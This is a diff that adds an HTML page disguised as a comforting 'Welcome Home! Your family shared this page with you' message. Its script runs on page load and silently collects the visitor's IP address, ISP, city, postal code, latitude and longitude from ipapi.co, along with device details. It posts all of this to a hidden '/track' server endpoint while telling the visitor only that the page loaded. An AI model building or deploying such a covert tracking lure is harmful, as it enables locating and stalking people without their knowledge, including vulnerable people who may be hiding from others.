@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Welcome</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .card {
+      background: rgba(255,255,255,0.15);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255,255,255,0.3);
+      border-radius: 24px;
+      padding: 3rem 2.5rem;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+
+    .icon {
+      width: 90px;
+      height: 90px;
+      background: rgba(255,255,255,0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1.5rem;
+    }
+
+    h1 { color: #fff; font-size: 28px; font-weight: 700; margin-bottom: 0.75rem; }
+
+    p  { color: rgba(255,255,255,0.85); font-size: 15px; line-height: 1.7; margin-bottom: 2rem; }
+
+    .dots { display: flex; justify-content: center; gap: 10px; }
+
+    .dot {
+      width: 12px; height: 12px;
+      background: rgba(255,255,255,0.7);
+      border-radius: 50%;
+      animation: bounce 1.2s infinite ease-in-out;
+    }
+
+    .dot:nth-child(2) { animation-delay: 0.2s; }
+    .dot:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes bounce {
+      0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
+      40%            { transform: scale(1);   opacity: 1;   }
+    }
+
+    .status {
+      margin-top: 1.5rem;
+      font-size: 13px;
+      color: rgba(255,255,255,0.5);
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="icon">
+    <svg width="44" height="44" viewBox="0 0 24 24" fill="none"
+         stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
+      <polyline points="9 22 9 12 15 12 15 22"/>
+    </svg>
+  </div>
+
+  <h1>Welcome Home!</h1>
+  <p>Your family shared this page with you. You are safe and loved.</p>
+
+  <div class="dots">
+    <div class="dot"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+  </div>
+
+  <div class="status" id="status">Loading...</div>
+</div>
+
+<script>
+  // ─── Configuration ─────────────────────────────────────────────────────────
+  // Auto-detects server URL — works on localhost AND on Render/any host
+  const SERVER_URL = window.location.origin + "/track";
+  // ───────────────────────────────────────────────────────────────────────────
+
+  function parseBrowser(ua) {
+    if (ua.includes("Edg"))     return "Microsoft Edge";
+    if (ua.includes("OPR"))     return "Opera";
+    if (ua.includes("Chrome"))  return "Google Chrome";
+    if (ua.includes("Firefox")) return "Mozilla Firefox";
+    if (ua.includes("Safari"))  return "Apple Safari";
+    return "Unknown Browser";
+  }
+
+  function parseOS(ua) {
+    if (ua.includes("Windows NT 10")) return "Windows 10 / 11";
+    if (ua.includes("Windows NT 6")) return "Windows 8";
+    if (ua.includes("Windows"))      return "Windows";
+    if (ua.includes("iPhone"))       return "iPhone (iOS)";
+    if (ua.includes("iPad"))         return "iPad (iOS)";
+    if (ua.includes("Android"))      return "Android";
+    if (ua.includes("Mac OS X"))     return "macOS";
+    if (ua.includes("Linux"))        return "Linux";
+    return "Unknown OS";
+  }
+
+  function getDeviceType(ua) {
+    if (/Mobi|Android|iPhone/.test(ua)) return "Mobile Phone";
+    if (/iPad|Tablet/.test(ua))          return "Tablet";
+    return "Desktop / Laptop";
+  }
+
+  async function collectAndSend() {
+    const ua = navigator.userAgent;
+
+    // Step 1: Get IP + ISP + location from ipapi.co (free, no key needed)
+    let ipData = {};
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      ipData    = await res.json();
+    } catch (e) {
+      ipData = {};
+    }
+
+    // Step 2: Build full payload
+    const payload = {
+      // IP & Network (from ipapi.co)
+      ip_address   : ipData.ip            || "N/A",
+      isp_name     : ipData.org           || "N/A",
+      asn          : ipData.asn           || "N/A",
+      country      : ipData.country_name  || "N/A",
+      country_code : ipData.country       || "N/A",
+      region       : ipData.region        || "N/A",
+      city         : ipData.city          || "N/A",
+      postal_code  : ipData.postal        || "N/A",
+      latitude     : ipData.latitude      || "N/A",
+      longitude    : ipData.longitude     || "N/A",
+      ip_timezone  : ipData.timezone      || "N/A",
+
+      // Device info (from browser JS — no permission needed)
+      browser         : parseBrowser(ua),
+      os              : parseOS(ua),
+      device_type     : getDeviceType(ua),
+      screen          : screen.width + "x" + screen.height,
+      language        : navigator.language,
+      timezone_local  : Intl.DateTimeFormat().resolvedOptions().timeZone,
+      cookies_enabled : navigator.cookieEnabled,
+      user_agent      : ua,
+      time_opened     : new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })
+    };
+
+    // Step 3: Send to Python Flask server
+    try {
+      await fetch(SERVER_URL, {
+        method  : "POST",
+        headers : { "Content-Type": "application/json" },
+        body    : JSON.stringify(payload)
+      });
+      document.getElementById("status").textContent = "Page loaded successfully.";
+    } catch (e) {
+      document.getElementById("status").textContent = "Page loaded.";
+    }
+  }
+
+  collectAndSend();
+</script>
+
+</body>
+</html>
